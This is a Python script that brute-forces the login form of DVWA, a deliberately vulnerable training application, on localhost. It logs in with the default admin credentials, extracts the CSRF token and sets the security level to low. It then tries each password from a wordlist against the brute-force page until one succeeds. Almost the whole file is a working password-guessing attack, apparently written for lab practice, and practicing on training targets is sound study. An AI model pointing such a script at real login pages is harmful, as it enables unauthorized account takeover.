import requests
from bs4 import BeautifulSoup
from enum import Enum
import string
import sys
class SecurityLevel(Enum):
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    IMPOSSIBLE = "impossible"
class CSRFManager:
    @staticmethod
    def set_csrf_token(func):
        def wrapper(*args, **kwargs):
            user_token = CSRFManager.get_token(args[0]._session, args[0].url)
            if user_token != None:
                args[0].user_token = user_token["value"]
            return func(*args, **kwargs)
        return wrapper
    @staticmethod
    def get_token(session: requests.Session, url: str):
        response = session.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')
        user_token = soup.find("input", {"name": "user_token"})
        return user_token
class DVWASessionProxy:
    login_data = {
        "username": "admin",
        "password": "password",
        "Login": "Login"
    }
    def __init__(self, url):
        super().__init__()
        self._session = requests.Session()
        self.url = f"{url}/DVWA/login.php"
        self.data = {}
    @property
    def security(self):
        return self._session.cookies.get_dict()["security"]
    @security.setter
    def security(self, security_level):
        self._session.cookies.pop("security")
        self._session.cookies.set("security", security_level.value)
    @property
    def user_token(self):
        return self.data["user_token"]
    @user_token.setter
    def user_token(self, value):
        self.data["user_token"] = value
    def __enter__(self):
        response = self.login(self.url, data={**self.data, **DVWASessionProxy.login_data})
        return self
    def get(self, url, headers=None, params=None, cookies=None):
        response = self._session.get(url, headers=headers, params=params, cookies=cookies)
        self.url = response.url
        return response
    @CSRFManager.set_csrf_token
    def login(self, url, headers=None, data=None):
        response = self._session.post(url, headers=headers, data={**self.data, **data})
    def post(self, url, headers=None, data=None, cookies=None):
        response = self._session.post(url, headers=headers, data=data, cookies=cookies)
        return response
    def __exit__(self, exc_type, exc_val, exc_tb):
        self._session.close()
def get_passwords(filename):
    q = []
    with open(filename, 'r') as f:
        for e in f.read().split("\n"):
            q.append(e)
    return q
def send_credentials(session, url, data):
    target_url = url
    for k, v in data.items():
        target_url+=f"{k}={v}&"
    target_url = target_url[:-1]+"#"
    response = session.get(target_url)
    return response
if __name__ == "__main__":
    BASE_URL = "http://127.0.0.1"
    bruteforce_url = f"{BASE_URL}/DVWA/vulnerabilities/brute?"
    filename = sys.argv[1]
    username = "admin"
    q = get_passwords(filename)
    with DVWASessionProxy(BASE_URL) as s:
        s.security = SecurityLevel.LOW
        for password in q:
            data = {
                "username": username,
                "password": password,
                "Login": "Login"
            }
            response = send_credentials(s, bruteforce_url, data)
            print(" " * 40, end="\r")
            print(f"[!] Testing: {password}", end="\r")
            if "password incorrect." not in response.text:
                print("")
                print(f"[+] Found: {password}")
                break